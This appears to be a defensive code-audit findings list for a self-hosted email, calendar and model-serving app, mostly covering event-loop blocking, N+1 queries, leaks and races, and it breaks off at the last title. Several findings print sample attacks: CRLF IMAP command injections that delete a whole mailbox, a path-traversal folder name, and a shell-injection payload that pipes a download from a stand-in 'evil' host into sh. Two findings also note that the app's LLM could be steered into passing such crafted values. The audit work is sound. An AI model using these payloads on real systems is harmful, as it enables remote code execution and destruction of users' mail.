title: Synchronous httpx network calls block the event loop in async delete_task
detail: delete_task is an `async def` handler (line 753) and calls `_maybe_cascade_calendar_event(task)` synchronously at line 768. That helper uses the BLOCKING `httpx.Client` (lines 59, 84, 102) with 10s timeouts. In the Strategy-2 fallback path it issues several sequential synchronous HTTP requests: GET /calendars, GET /events, then one DELETE per matched UID (line 126) — each up to 10s. Because these run on the asyncio event loop thread with no await, a slow or hung calendar backend stalls the ENTIRE server: no other request (any user, any route) is served until the cascade completes or times out, potentially 30s+ for a single task deletion. Failure scenario: user deletes a cookbook_serve task while the internal calendar API is slow/unreachable; every concurrent request hangs for the duration.
fix: Convert `_maybe_cascade_calendar_event` to async using `httpx.AsyncClient` and `await` the calls, then `await _maybe_cascade_calendar_event(task)`; or, keeping it sync, offload it with `await asyncio.to_thread(_maybe_cascade_calendar_event, task)` so the blocking I/O runs off the event loop.

title: N+1 queries and repeated full-table scan in list_recent_runs
detail: In the response comprehension (line 935) `_resolve_run_endpoint(db, t, r)` is invoked once per deduped run row (up to `limit`, max 200). Each call (lines 255-287) can run a `DbSession` lookup by id AND, when no session endpoint is found, executes `db.query(ModelEndpoint).filter(is_enabled==True).all()` — loading every enabled endpoint and JSON-parsing each row's `cached_models` — on EVERY iteration. For a 200-row Activity view this produces hundreds of queries and re-scans/re-parses the full ModelEndpoint table up to 200 times per request. Failure scenario: an owner with many task runs and several model endpoints opens the Activity view; the endpoint does O(rows × endpoints) work and JSON parsing, making the request slow and DB-heavy.
fix: Fetch and JSON-parse the enabled ModelEndpoint list once before the loop (build a model→base_url dict), and pass it into `_resolve_run_endpoint` (or resolve inline) so each row is an O(1) dict lookup instead of a fresh full-table query and parse.

title: parse_task returns raw internal exception text to the client
detail: On any failure the handler returns `{"success": False, "message": str(e)}` (line 1155). The caught exceptions include failures from `resolve_endpoint` / `llm_call_async`, whose messages can embed internal endpoint URLs, ports, or backend error detail. Failure scenario: a misconfigured or failing model endpoint causes the raw exception string (e.g. a full internal base_url or connection error) to be surfaced to the frontend/user, leaking internal infrastructure details.
fix: Log the full exception (already done via logger.error) but return a generic message to the client, e.g. `{"success": False, "message": "Could not parse the task description"}`.

title: consolidate_memory: unlocked read-modify-write of the whole memory store across minutes-long LLM calls loses concurrent writes
detail: manager.load_all() snapshots every memory at L86, then the action awaits one llm_call_async per owner group with timeout=120s each (L152-160), then manager.save(all_memories) at L275 writes the full snapshot back. Any memory the user (or a chat session) adds/edits between the load and the save is silently overwritten and lost — with N owner groups the window is N*120s. There is no lock, version check, or delta-apply; the save is a blind full-store replace.
fix: Re-load the store immediately before saving and apply only the computed deltas (drop ids by id, text/category patches by id) to the fresh list, ideally under a file lock or the MemoryManager's own locking primitive if it has one; never persist the pre-LLM snapshot wholesale.

title: action_classify_events classifies and mutates every user's events using the triggering owner's private memories
detail: The event query (L599-603) has no owner filter, so a run scoped to owner A loads all users' upcoming events, sends their titles/locations to the LLM together with owner A's personal memory context (_memory_context, L615-626: relationships, job, life details), and writes event_type/importance/color back onto other users' rows (L642-644, L714-718). This both leaks owner A's memories into classification prompts that contain other users' event data, and lets one user's task overwrite classification fields on events they don't own.
fix: Apply the same owner_filter-via-CalendarCal join used in action_daily_brief (L1014-1020) so only the task owner's events are loaded and updated.

title: Synchronous SQLAlchemy/sqlite3 database work runs directly on the event loop in async handlers
detail: IMAP work is correctly pushed to threads (asyncio.to_thread at L842, L916, L1632), but all DB work is sync-on-loop: the email_tags mirror loop (L1787-1847) does one SELECT plus one UPDATE/INSERT per unread email inside 'async def' with a plain sqlite3 connection — on a busy inbox that is hundreds of blocking statements, and SQLite write-lock contention (busy timeouts) can stall the loop for seconds. Same pattern for sync SQLAlchemy sessions: tidy_calendar full-table scan (L410-419), classify_events (L595-603), daily_brief (L1012-1026), ping_notes (L1356-1363), check_email_urgency account query (L1505-1513), and the sender_signatures reads/writes (L860, L971). While any of these runs, every other coroutine in the FastAPI process (HTTP requests, other scheduled tasks) is frozen. L413 also executes db.query(CalendarEvent).count() and discards the result — a pointless full-table COUNT on every run.
fix: Wrap each sync-DB block in await asyncio.to_thread(...) (the file already does this for IMAP), or move whole action bodies into to_thread; delete the dead .count() call at L413.

title: sqlite3 connections leaked on exception in learn_sender_signatures
detail: At L971-979 conn = _sql3.connect(SCHEDULED_DB); conn.execute(...); conn.commit(); conn.close() — if execute or commit raises (e.g. 'database is locked' while another action holds the write lock, or missing sender_signatures table), the except at L981 logs and continues the loop with the connection never closed. Same shape at L860-866 for the cache read (exception between connect and close leaks the handle, and the close is skipped). With the 20-senders-per-pass loop and a persistently locked DB, each run leaks up to 20 open sqlite handles that also pin the lock state until GC finalizes them.
fix: Use closing()/context manager: 'with _sql3.connect(SCHEDULED_DB) as conn:' plus a finally conn.close(), or try/finally around every connect in this function (the email_tags block at L1787 already does try/finally correctly — copy that pattern).

title: classify_events re-sends 'normal'-importance events to the LLM on every single run, forever
detail: The skip condition is 'if ev.event_type and ev.importance and ev.importance != "normal"' (L637). Any event the LLM classifies as importance='normal' — the most common verdict per the prompt's own guide (L687) — fails the skip test on the next run and is queued and re-classified again (L651-652, L691). For a task scheduled hourly with a 30-day horizon, every routine meeting is re-LLM'd 24 times a day indefinitely: unbounded recurring token cost and latency with zero benefit.
fix: Skip whenever both fields are already set regardless of value: 'if ev.event_type and ev.importance: unchanged += 1; continue' — or persist a classified_at timestamp and only re-classify after N days.

title: cookbook_serve non-atomic read-modify-write of cookbook_state.json races with the UI
detail: L2149-2192: the action re-reads cookbook_state.json ('fresh'), appends/stamps a task entry, and rewrites the whole file with atomic_write_json. The write itself is atomic, but the read-modify-write sequence is not locked — the comment at L2150 admits 'the route may have updated state already'. If the UI (or the lifecycle loop in cookbook_serve_lifecycle.py, which the docstring says consumes _scheduledStopAtMs) writes state between the read at L2151 and the write at L2192, its changes are silently clobbered; conversely if the UI wins, the _scheduledStopAtMs stamp is lost and the 'end_after_min' hard-stop never fires, leaving the model serve running indefinitely.
fix: Guard the read-modify-write with a file lock (e.g. filelock/fcntl.flock on cookbook_state.json.lock) shared with every other writer of this file, or route the mutation through a single owner (the serve API) instead of writing state from two places.

title: learn_sender_signatures and daily_brief read the default mailbox regardless of task owner
detail: Both actions call _imap_connect(None) (L810, L894, L1037), which connects to the default/global email account, and neither checks 'owner' against that account. Contrast action_check_email_urgency, which explicitly enumerates EmailAccount rows filtered by owner (L1505-1513) precisely so one user's task cannot read another user's mailbox. In a multi-user deployment, user B scheduling learn_sender_signatures or daily_brief gets sender addresses, subjects, unread counts, and up-to-4000-char email bodies (L905-906) from user A's default account, and daily_brief returns the subjects/senders in its result string shown in B's activity feed.
fix: Resolve the account the same way check_email_urgency does (EmailAccount filtered by owner, with the legacy unowned-mailbox fallback) and pass that account id to _imap_connect; refuse to fall back to the global default when auth is configured and the account owner does not match.

title: check_email_urgency: transient IMAP failure for one account wipes its notified-state and causes duplicate urgent notifications
detail: If _scan_one raises for an account, the code logs and 'continue's (L1633-1635), so none of that account's unread keys enter all_unread_keys. The prune at L1934 then drops every notified_uids entry for that account ('keep only UIDs still in all_unread_keys'), and the pruned state is persisted at L1946. On the next successful run all of that account's still-unread urgent emails are treated as new_urgent (L1866) and the user is re-notified for messages they were already pinged about — every time the IMAP server hiccups.
fix: Track which accounts scanned successfully and only prune notified_uids belonging to successfully-scanned accounts (key prefix '<acc.id>:'), leaving entries for failed accounts untouched.

title: Cross-tenant deactivation of ALL users' active documents on attachment import
detail: In attachment_as_doc, the DOCX path (line 1618) and the txt/md path (line 1645) run `_db.query(_Doc).filter(_Doc.is_active == True).update({"is_active": False})` with no owner or session filter. This sweeps the ENTIRE Document table. Failure scenario: in a multi-user deployment, user A opens an email attachment as a document; every other user's active documents are flipped to is_active=False, so their doc lists/editors (document_routes.py filters on is_active==True at lines 296/306/315/786/901) suddenly show nothing. No other code path in the repo does an unscoped is_active sweep (verified via grep — only these two lines). It is a cross-tenant data mutation triggered by an unrelated user's routine action. Also note the new Document rows created here set no `owner`, unlike document_routes.py which stamps owner explicitly.
fix: Scope the deactivation to the caller: `.filter(_Doc.is_active == True, or_(_Doc.owner == _doc_user, _Doc.session_id == doc_session_id))` (or drop the sweep entirely, matching document_routes.py which creates new docs without deactivating others), and stamp `owner=_doc_user` on the created Document.

title: ai_reply performs blocking IMAP mining and a blocking HTTP call directly on the event loop
detail: The async ai_reply handler calls three synchronous, slow operations without asyncio.to_thread: (1) line 2682 `list_model_ids(url, headers=headers)` — a blocking HTTP request to the LLM endpoint (only skipped on cache hit); (2) line 2699 `_pre_retrieve_context(...)` — per its own docstring searches past emails via IMAP; (3) lines 2710-2716 `_fetch_sender_thread_context(...)` — multi-folder IMAP searches plus attachment text extraction (PDF parsing). The file's own comment at 2693-2695 says this mining 'can involve multiple IMAP folder searches and attachment parsing'. Failure scenario: a user clicks AI Reply (non-fast mode) against a remote IMAP server; the event loop is frozen for the full duration (easily 5-30s: IMAP round-trips + PDF extraction + an HTTP models call), during which every other request to the entire FastAPI app — not just email — hangs. Compare extract_writing_style (line 2366) which correctly offloads its IMAP work for exactly this reason.
fix: Wrap the context mining in a thread: `context_snippets, _terms = await asyncio.to_thread(_pre_retrieve_context, original_body, to, owner=owner)`, same for `_fetch_sender_thread_context` and `list_model_ids` (or bundle all three into one `_gather()` function run via to_thread).

title: resolve_contact issues up to ~600 sequential blocking IMAP fetches in the async handler
detail: resolve_contact runs entirely on the event loop (no to_thread): for each of 3 folders it does SEARCH ALL, takes the last 200 UIDs, and issues one `conn.fetch(uid, ...)` round-trip PER MESSAGE (line 2097) — up to ~600 sequential network round-trips inside `async def`. Failure scenario: against a remote IMAP server at 20-50ms RTT, one call to /api/email/resolve-contact blocks the event loop for 12-30 seconds, stalling every concurrent request in the app. Even on localhost Dovecot it is a multi-second loop freeze. This is both blocking-in-async and a classic N+1: the batched-fetch technique already used in _list_emails_sync (line 806, single FETCH for the whole UID set of just the FROM/TO/CC headers) would collapse it to 3 round-trips.
fix: Move the whole body into a sync function executed via `await asyncio.to_thread(...)`, and replace the per-UID loop with one batched `conn.fetch(b",".join(uids), "(BODY.PEEK[HEADER.FIELDS (FROM TO CC)])")` per folder.

title: IMAP command injection via CRLF in `from` filter and folder names
detail: In _list_emails_sync, `from_addr` (the `?from=` query param) is escaped only for backslash and double-quote before being embedded in the IMAP SEARCH command: `_safe = from_addr.replace("\\", "\\\\").replace('"', '\\"')`. CR/LF are not stripped, and imaplib.IMAP4._command performs NO CRLF validation on args (verified by inspecting the stdlib source in this environment — args are byte-joined and sent verbatim followed by CRLF). The same gap applies to every `folder`/`dest` query param passed through `_q()` (email_helpers.py line 242), whose docstring's claim that "imaplib already rejects CRLF" is false. Failure scenario: an authenticated user requests `/api/email/list?from=x%0d%0aA99 UID STORE 1:* +FLAGS (\Deleted)%0d%0aA98 EXPUNGE` and injects arbitrary pipelined IMAP commands into the pooled connection, corrupting the pooled session state and bypassing any app-level restrictions on what IMAP operations the API exposes. The file itself acknowledges this exact vector — /search rejects CRLF at lines 1081-1083 — but /list's `from` and all folder params are unprotected.
fix: Reject or strip CR/LF (and other control chars) from `from_addr`, `folder`, and `dest` at the top of each handler, mirroring the /search guard: `if "\r" in v or "\n" in v: raise HTTPException(400)`. Also add the check inside `_q()` so all call sites are covered.

title: IMAP pool overwrite leaks live TLS connections under concurrency
detail: _pooled_release does `_IMAP_POOL[(account_id, owner)] = (conn, now)` unconditionally. The pool holds one slot per (account_id, owner); _pooled_connect pops the entry while in use. Failure scenario: two concurrent requests for the same account both miss the pool (first popped the entry / pool empty), both open fresh IMAP4_SSL connections via _imap_connect, and both release — the second release silently overwrites the first connection's pool entry. The displaced connection is never logout()'d or closed; the TLS socket and file descriptor stay open until server-side timeout. Any mailbox with concurrent UI activity (list + read + prefetch warm all fire together) leaks sockets steadily; against providers with per-user connection caps (Gmail: 15) this also exhausts the IMAP connection quota and subsequent logins fail.
fix: In _pooled_release, check for an existing entry before storing: if the slot is occupied, logout/close the incoming conn (or the displaced one) instead of overwriting: `old = _IMAP_POOL.get(key);` if old exists, `try: conn.logout() except: pass; return` — or make the pool hold a small list per key.

title: search_emails blocks the event loop and does N+1 per-UID fetches
detail: The async search_emails handler runs its full IMAP session (select, SEARCH, then one `_imap_uid_fetch` round-trip per result UID — up to `limit`=50, line 1101-1103) synchronously on the event loop. Failure scenario: a body-text search (`TEXT "..."`) on a large remote mailbox takes seconds server-side, plus 50 sequential header fetches; the event loop is stalled the entire time, freezing all other users' requests. The sibling _list_emails_sync was explicitly rewritten to (a) run in asyncio.to_thread (line 997) and (b) batch-fetch all UIDs in one round-trip (comment at lines 798-801 documents that per-UID fetch cost 250ms-1s+); search_emails got neither fix.
fix: Extract the body into `_search_emails_sync(...)` called with `await asyncio.to_thread(...)`, and batch the fetch: `_imap_uid_fetch(conn, b",".join(uid_list), "(UID FLAGS RFC822.HEADER)")` then group results, reusing the grouping logic from _list_emails_sync.

title: Fourteen mailbox endpoints run blocking IMAP (including full-message RFC822 fetches) inside async def
detail: list_attachments (1409), download_attachment (1426), attachment_as_doc (1462), get_attachment_path (1670), mark_unread (1692), mark_read (1706), archive_email (1720), delete_email (1734), delete_email_permanent (1748), delete_atenea_reminder_emails (1786, which additionally loops STORE per UID across up to 4 folders), move_email (1838), list_folders (1852), mark_answered (1870), and clear_answered (1883) all execute `with _imap(...)` network I/O directly in the async handler with no to_thread. The attachment endpoints are worst: they FETCH `(RFC822)` — the complete raw message including all attachments — synchronously, so a 25MB attachment email freezes the event loop while the whole body streams in and is then parsed and written to disk (also loading the full message into memory). Failure scenario: one user downloads a large attachment from a slow IMAP server; every other request in the app hangs for the duration. The file's own /list and /read handlers demonstrate the correct pattern (asyncio.to_thread).
fix: Wrap each handler's IMAP block in a small sync function and call it via `await asyncio.to_thread(...)` (the flag/move ones are one-liners to convert). For attachment endpoints, fetch `BODY.PEEK[n]` of just the target part instead of RFC822 where feasible.

title: test_account_config performs blocking IMAP/SMTP connects with 10s+ timeouts on the event loop
detail: The async test_account_config handler opens raw sockets synchronously: `_open_imap_connection(...)` + login (timeout=_IMAP_TIMEOUT_SECONDS) at 3159-3171, then `smtplib.SMTP_SSL/SMTP(..., timeout=10)` + starttls + login at 3183-3194. Failure scenario: the user tests a config pointing at an unreachable/filtered host (the normal case when debugging a config!) — each connect blocks until its timeout, so the event loop freezes for up to ~20-30s combined and the whole app is unresponsive to all users while the dots spin. This endpoint is precisely the one most likely to be called with bad/hanging hosts.
fix: Move the IMAP and SMTP test blocks into a sync function and run it via `await asyncio.to_thread(...)` (they already return plain dicts, so the refactor is mechanical).

title: Synchronous SQLite and SQLAlchemy calls sprinkled through async handlers
detail: Several async handlers do sync DB work on the event loop: `_record_email_received_events` at line 1003 runs AFTER the to_thread returns, i.e. on the loop, doing sqlite connect/CREATE TABLE/SELECT/executemany/commit per uncached /list call; unflag_spam (1013, which also triggers _email_tag_owner_aliases' SQLAlchemy session); list_contacts (1040 — loads EVERY email_tags.sender row into Python and filters there, O(table) per autocomplete keystroke); schedule_email (2011); list_scheduled (2045); cancel_scheduled (2068); summarize cache write (2559); ai_reply cache read/write (2599/2802) plus its SQLAlchemy session lookup (2637); and the accounts CRUD handlers (2936, 2982, 3028, 3061, 3113). Failure scenario: SQLite writes serialize on the DB lock — when the background pollers hold a write transaction on SCHEDULED_DB, any of these calls blocks the event loop for the lock-wait duration (default sqlite busy timeout up to 5s), stalling all requests.
fix: Route these through `await asyncio.to_thread(...)` (or a shared sync-DB executor). For list_contacts, push the filter into SQL (`WHERE sender LIKE ?` with a LIMIT) instead of scanning the table in Python.

title: Network round-trips (NOOP/logout) executed while holding the global pool lock
detail: _pooled_connect calls `conn.noop()` (line 517) and `conn.logout()` (lines 521, 526) inside `with _pool_lock:` — a single global threading.Lock covering all accounts and all users. Failure scenario: a pooled connection has silently died (NAT timeout); `conn.noop()` on it blocks until the socket read times out (_IMAP_TIMEOUT_SECONDS). Every other thread and every async handler that touches `_imap()` for ANY account waits on the lock for that entire time — a single stale connection turns into an app-wide stall (and for the handlers in the blocking-IMAP finding, an event-loop stall).
fix: Under the lock only pop the entry from the dict; perform noop()/logout() after releasing the lock, and re-acquire briefly if the entry must be restored.

title: Dead `async def _send_email_sync` — misdeclared and unreachable
detail: `_send_email_sync` (lines 1929-1972) is defined but never called anywhere in the repo (grep confirms the definition is the only occurrence); its docstring claims it is 'used by both /send and scheduled delivery' but /send has its own inline _deliver closure and scheduled delivery lives in email_pollers. It is also declared `async def` while containing zero awaits and a fully blocking `_send_smtp_message` call — if anyone ever wires it up as intended, awaiting it will block the event loop for the whole SMTP transaction. Dead code with a booby-trapped signature and a misleading docstring hides the real send path from maintainers.
fix: Delete the function, or if it is meant to be the shared send path, make it a plain `def` and have callers run it via asyncio.to_thread.

title: _WARMING_READS entries stranded forever when the warm task cannot be scheduled
detail: _schedule_recent_email_warm adds cache keys to the module-lifetime `_WARMING_READS` set (line 1378) BEFORE attempting `_asyncio.create_task(_warm())` (line 1401). If create_task raises RuntimeError (no running loop — the very case the except clause anticipates), the added keys are never discarded: the guard at line 1376 (`ck in _WARMING_READS`) then permanently skips warming those messages, and the set grows without bound as new keys hit the same path. The discard only happens inside _warm's finally, which never runs.
fix: Move the `_WARMING_READS.add(ck)` calls after a successful create_task, or in the `except RuntimeError` branch discard every ck in `selected` before returning.

title: IMAP command/search injection via unsanitized message_id, uid message-sets, and CRLF in folder names
detail: _read_email interpolates the caller-supplied message_id directly into an IMAP SEARCH: f'(HEADER Message-ID "{message_id}")' with no escaping (contrast _search_emails line 562, which escapes backslash and quote). A message_id containing a double-quote breaks out of the quoted string and injects arbitrary SEARCH criteria; a message_id containing CRLF injects a whole new IMAP command, since imaplib does not sanitize command arguments (e.g. message_id = 'x")\r\nA002 STORE 1:* +FLAGS (\\Deleted)' can flag the entire mailbox for deletion). message_id is attacker-influenced: an inbound mail's Message-ID header is echoed by list_emails and the LLM is instructed to pass it back verbatim. Related unvalidated inputs on the same code path: _q (line 47) escapes quotes but not CR/LF in folder names, and _bulk_set_flag/_bulk_move (lines 982, 1009) join caller-supplied uids into a raw message-set — a 'uid' of '1:*' with action=delete/permanent expunges the whole folder, and uids with spaces/CRLF inject extra FETCH/STORE arguments.
fix: Sanitize before building IMAP commands: reject any argument containing \r or \n; escape backslash and double-quote in message_id the same way _search_emails does (or use a literal); validate every uid against ^\d+$ before joining into msg_set; strip CR/LF in _q.

title: All IMAP/SMTP/SQLite I/O runs synchronously inside async call_tool, blocking the event loop
detail: call_tool is 'async def' but every operation it dispatches is blocking: imaplib connect/login/select/search/fetch (socket timeout 20s each, line 36), smtplib send, and sqlite3 reads. Worst case: _list_emails_across_accounts (line 527) sequentially opens one IMAP connection per configured account and issues ~20 per-message FETCHes per account; with 3 accounts and a slow/unreachable server the event loop is frozen for minutes. While blocked, the MCP server cannot process any other request, cancellation, ping, or stdio traffic — the whole agent's email tooling appears hung, and a single dead IMAP host stalls unrelated tool calls.
fix: Wrap the synchronous tool implementations in await asyncio.to_thread(...) inside call_tool (e.g. result = await asyncio.to_thread(_list_emails, ...)), or migrate to an async IMAP/SMTP client (aioimaplib/aiosmtplib).

title: Cross-account UID confusion: reply/delete/archive/mark default to the default account after a merged multi-account listing
detail: When >=2 accounts are configured and no account is passed, list_emails merges results across all accounts (line 1404) and read_email probes all accounts (line 1513). But reply_to_email, delete_email, archive_email, mark_email_read, and bulk_email (lines 1563-1655) silently resolve account=None to the default account. IMAP UIDs are per-mailbox, so a UID taken from account B's row in the merged list will match a completely different message in account A. Failure scenario: user says 'reply to that one' about a work-account email; the LLM omits account; _reply_to_email fetches the same UID in the default personal account, and the drafted reply body is sent to whoever sent that unrelated personal email — disclosing the reply content to the wrong recipient. delete/archive similarly destroy the wrong message.
fix: In call_tool, when _list_accounts_raw() returns >=2 accounts and acct is None, refuse destructive/reply operations with an error asking for the account (mirroring _read_email_across_accounts' ambiguity error), or encode the account id into the UID strings returned by list_emails and resolve it server-side.

title: _ACCOUNT_CACHE is unbounded and never invalidated; caches decrypted passwords and stale config forever
detail: Every distinct account selector string becomes a permanent _ACCOUNT_CACHE key (line 146/227). When the email_accounts table is empty (legacy mode) or the selector fuzzy-matches, arbitrary LLM-supplied selector strings are cached with no size cap, growing for the life of the process. Worse, entries are never invalidated: if the user rotates an IMAP/SMTP password or edits an account in app.db, this server keeps using the old decrypted credentials (and old hosts/folders) until restart — logins fail with AUTHENTICATIONFAILED indefinitely even though the DB is correct. The cache also pins plaintext-decrypted passwords in a module-global dict for the process lifetime.
fix: Key the cache with a TTL (e.g. store (expires_at, cfg) and re-read after ~60s) or invalidate when os.path.getmtime(APP_DB) changes; cap entries (only cache selectors that resolved to a DB row) and consider not caching decrypted passwords at all.

title: Authenticated IMAP socket leaked when select() raises in _set_flag and _move_message
detail: _set_flag calls conn.select(_q(folder)) at line 956 and _move_message at line 1049 BEFORE entering the try/finally that performs conn.logout(). imaplib.IMAP4.select raises imaplib.error on a BAD response (e.g. malformed/CRLF-bearing folder name, server abort, dropped connection), in which case the logged-in socket is never logged out or closed and leaks until GC. Contrast _bulk_set_flag (line 978) and _search_uids (line 1037), which correctly put select inside the try. Under repeated tool calls against a flaky server this exhausts server connection limits (Dovecot's default mail_max_userip_connections=10) and file descriptors.
fix: Move the conn.select(...) call inside the existing try block in both _set_flag and _move_message so the finally: conn.logout() always runs.

title: N+1 IMAP FETCH per message and full-table summary cache reload on every call
detail: _list_emails issues one 'UID FETCH <uid> (RFC822.HEADER)' round trip per message (line 476), and _search_emails does the same per hit per folder (line 584). Listing 20 emails over a 50ms-RTT link costs 20 sequential round trips (~1s+) instead of one 'UID FETCH uid1,uid2,... (RFC822.HEADER)'; multiplied per account by _list_emails_across_accounts and all inside the blocked event loop. Additionally _get_cached_summaries (line 425) SELECTs the entire email_ai table into a dict on every list/search call — called once per account per listing — so a large summary cache is re-read repeatedly. Note it also fetches RFC822.HEADER (not BODY.PEEK[HEADER]), which sets \Seen on non-readonly sessions — harmless here only because the folder is opened readonly.
fix: Fetch all UIDs in one command: conn.uid('FETCH', b','.join(uid_list), '(RFC822.HEADER)') and split the multi-message response; load the summary cache once per tool call and pass it down, or index email_ai by subject with a WHERE clause.

title: Attachment download path built from unsanitized folder argument allows writes outside MAIL_ATTACHMENTS_DIR
detail: _download_attachment computes target_dir = Path(MAIL_ATTACHMENTS_DIR) / f"{folder}_{uid}" with the caller-supplied folder used verbatim; attachment filenames are sanitized (line 670) but the folder is not. A folder value containing '/' or '..' segments (e.g. '../../home/user/.config/autostart') makes os.makedirs + open write the attachment payload outside the attachments directory. Exploitation requires the IMAP select of that folder name to succeed (subsequent FETCH raises otherwise), so it needs a mailbox with pathological name — reachable on servers that permit '/' in mailbox names or when the LLM is prompt-injected into passing a crafted folder for a real hierarchical mailbox. Defense-in-depth gap rather than a trivially reachable hole.
fix: Sanitize the directory component the same way filenames are: safe_folder = re.sub(r'[^\w\-.]', '_', folder), then target_dir = Path(MAIL_ATTACHMENTS_DIR) / f"{safe_folder}_{uid}" and verify target_dir.resolve().is_relative_to(Path(MAIL_ATTACHMENTS_DIR).resolve()).

title: SQLite connections not closed on exception in _list_accounts_raw and _get_cached_summaries
detail: In _list_accounts_raw (lines 80-96) and _get_cached_summaries (lines 424-434), conn.close() only runs on the success path; if the SELECT raises (schema mismatch, locked DB, corrupted cache), the except swallows the error and the connection object is left open until GC. These functions are called on nearly every tool invocation (once per account in the multi-account path), so a persistently failing query keeps churning open handles and can hold SQLite locks longer than needed. The bare 'except Exception: return []/{}' also hides real DB errors (e.g. 'database is locked'), making 'no accounts configured' indistinguishable from a broken app.db.
fix: Use contextlib.closing: 'with closing(sqlite3.connect(...)) as conn:' around the query in both functions, and log the swallowed exception (logger.warning) instead of silently returning empty.

title: conn.quit() in finally can mask the send result in _send_email
detail: _send_email does 'finally: conn.quit()' with no exception guard. If the SMTP server closes the connection right after accepting DATA (common with some MTAs), send_message succeeds but quit() raises SMTPServerDisconnected; the exception propagates from the finally, call_tool reports 'Error: ...', and the LLM/user believes the send failed even though the message was delivered — the natural retry produces a duplicate email to the recipient. Conversely, if send_message itself raised, a second exception from quit() replaces the original error, hiding the real cause.
fix: Guard the cleanup: 'finally:\n    try: conn.quit()\n    except Exception: logger.debug("SMTP quit failed", exc_info=True)' so quit failures never change the send outcome.

title: Plaintext HF token persisted in world-readable runner scripts under /tmp that are never deleted
detail: model_download and model_serve write `export HF_TOKEN='<raw token>'` (lines 322, 429, 1033) and `$env:HF_TOKEN = '<raw token>'` (lines 372, 961) into runner scripts stored in TMUX_LOG_DIR, which is `Path(tempfile.gettempdir())/'atenea-tmux'` = /tmp/atenea-tmux — a shared, world-traversable temp dir. The scripts are chmod 0o755 (lines 482, 514, 1199), i.e. world-READABLE, and the local copies (`<session>_run.sh`, `<session>_run.ps1`, `<session>.sh` from _launch_local_detached line 246) are never deleted — only the remote scp copies self-delete (lines 400, 476). The app clearly treats this token as a secret elsewhere: it is encrypted at rest in cookbook state (_encrypt_secret, line 113) and masked for clients (line 101). Failure scenario: on any multi-user host, `cat /tmp/atenea-tmux/serve-*_run.sh` by any local user yields the admin's HuggingFace token, indefinitely, long after the download/serve completed.
fix: Never embed the raw token in the script. Pass HF_TOKEN via the subprocess/tmux environment (`tmux new-session -d -e HF_TOKEN=...` or Popen env=) or a 0o600 env-file sourced then shredded. At minimum: chmod runner files 0o700, write them via a mkstemp with restrictive umask, and unlink local runner files after launch / on task completion.

title: Generated bash for `ollama serve` is syntactically invalid: `for` loop never closed, stray `fi`, variable used before assignment
detail: The handled_ollama_serve branch emits: `for _ate_off in 0 1 ... 9; do` (line 1107), an inner `if ... fi` (1109-1113), then 'Ollama API ready' echoes + `exec bash -i` INSIDE the loop body (1114-1121), then a bare `fi` (line 1122) — there is no `done` anywhere, and the `fi` at 1122 has no matching `if`. Bash aborts the runner with 'syntax error near unexpected token fi'. Additionally, line 1114 references ${ATENEA_OLLAMA_URL} which is only assigned at line 1132, and the 'monitoring an existing Ollama server' path executes on the FIRST busy port instead of after the scan exhausts all 10 offsets — the exact opposite of the comment at 1100-1104. Failure scenario: every `ollama serve` launched via POST /api/model/serve on a POSIX host (local tmux or remote) dies instantly with a bash syntax error; the API still returns ok=True and auto-registers an endpoint that will never come up.
fix: Restructure to: for loop containing only the port probe + break, closed with `done`; after the loop, `if` no free port was found emit the 'existing server' message; assign ATENEA_OLLAMA_URL before first use. Add a unit test that runs `bash -n` on the generated runner script.

title: Windows-remote download .ps1 contains literal doubled braces `{{`/`}}` — script is broken, download never runs
detail: In the `remote and is_windows` download branch, most ps_lines are PLAIN strings, not f-strings, so the `{{`/`}}` escapes are written verbatim into the .ps1: `ps_lines.append('try {{')` (376), `'if ($hfPath) {{'` (378), `'}} else {{'` (381), `'if ($LASTEXITCODE -eq 0) {{ ... DOWNLOAD_OK }}'` (395), `'}} catch {{'` (397), `'}}'` (399). Only lines 380/387/392/400 are f-strings (where {{ would correctly collapse). PowerShell parses `try {{` as a try whose block contains an uninvoked scriptblock literal, and `}} else {{` is a parse error — the runner fails to parse/execute, so `hf download` never starts and the DOWNLOAD_OK sentinel the status poller looks for is never emitted. Contrast with the serve branch (lines 967-985) which correctly uses single braces. Failure scenario: any model download targeted at a Windows remote host silently produces a dead session; status poller reports it stopped/unknown with no useful error.
fix: Replace the doubled braces with single braces in every non-f-string ps_lines.append in the download branch (lines 376-399), mirroring the correct serve-branch style.

title: Blocking subprocess.run / socket.connect / sync SQLAlchemy inside async model_serve handler stalls the event loop
detail: model_serve (async def) directly calls: (1) _pick_free_port_for_ollama (line 930) which for remote hosts runs a synchronous `subprocess.run(ssh..., timeout=8)` (line 738) and for local probes up to 11 sequential blocking socket.connect calls at 0.25s timeout each (lines 750-757); (2) _auto_register_image_endpoint / _auto_register_llm_endpoint (lines 1301, 1303) which do synchronous SQLAlchemy SessionLocal() query/commit (lines 679-709, 815-852) plus _docker_host_gateway_reachable() — a network reachability probe (line 804) — all on the event loop. Failure scenario: one POST /api/model/serve for an ollama command against a slow/unreachable SSH host freezes the ENTIRE FastAPI server (all chat/SSE/API traffic) for up to ~8 seconds; the file itself documents this exact failure mode for the status endpoint (comment at lines 2218-2221) but repeats it here.
fix: Wrap the blocking sections: `await asyncio.to_thread(_pick_free_port_for_ollama, ...)` and `await asyncio.to_thread(_auto_register_llm_endpoint, req, remote)` (same for the image variant), or convert the port probe to asyncio.open_connection.

title: Unvalidated `local_dir`/`repo_id` from admin-writable state interpolated into a remote SSH shell command
detail: _download_cache_complete builds `ls '{local_path}'/*.gguf 2>/dev/null | head -1` where local_path is derived from task `payload.local_dir` and `repo_id` read straight from the cookbook state file (line 2494: `_payload.get("repo_id") or model`, `_payload.get("local_dir")`), and executes it on the remote host via ssh. Unlike session_id/remoteHost/sshPort — which THIS SAME function re-validates precisely because "cookbook state is admin-writable but the values land in shell-interpolated commands" (comment lines 2349-2351) — local_dir and repo_id get no validation here. POST /api/cookbook/state accepts arbitrary task payloads, so a payload with local_dir = `x'; curl http://evil/x | sh; '` executes arbitrary commands on the remote host at the next status poll (runs automatically every ~3s via the UI). The request-time _validate_local_dir at line 293 does not protect this path since state is written independently.
fix: In _download_cache_complete, validate local_dir with _validate_local_dir/_LOCAL_DIR_RE and repo_id with the repo-id regex before building the ssh command, and use shlex.quote(local_path) instead of manual single quotes (matching the shlex.quote usage at line 2289).

title: setup_cmd ssh/scp launched with no timeout and `proc.wait()` while stdout/stderr are PIPEd — request can hang forever
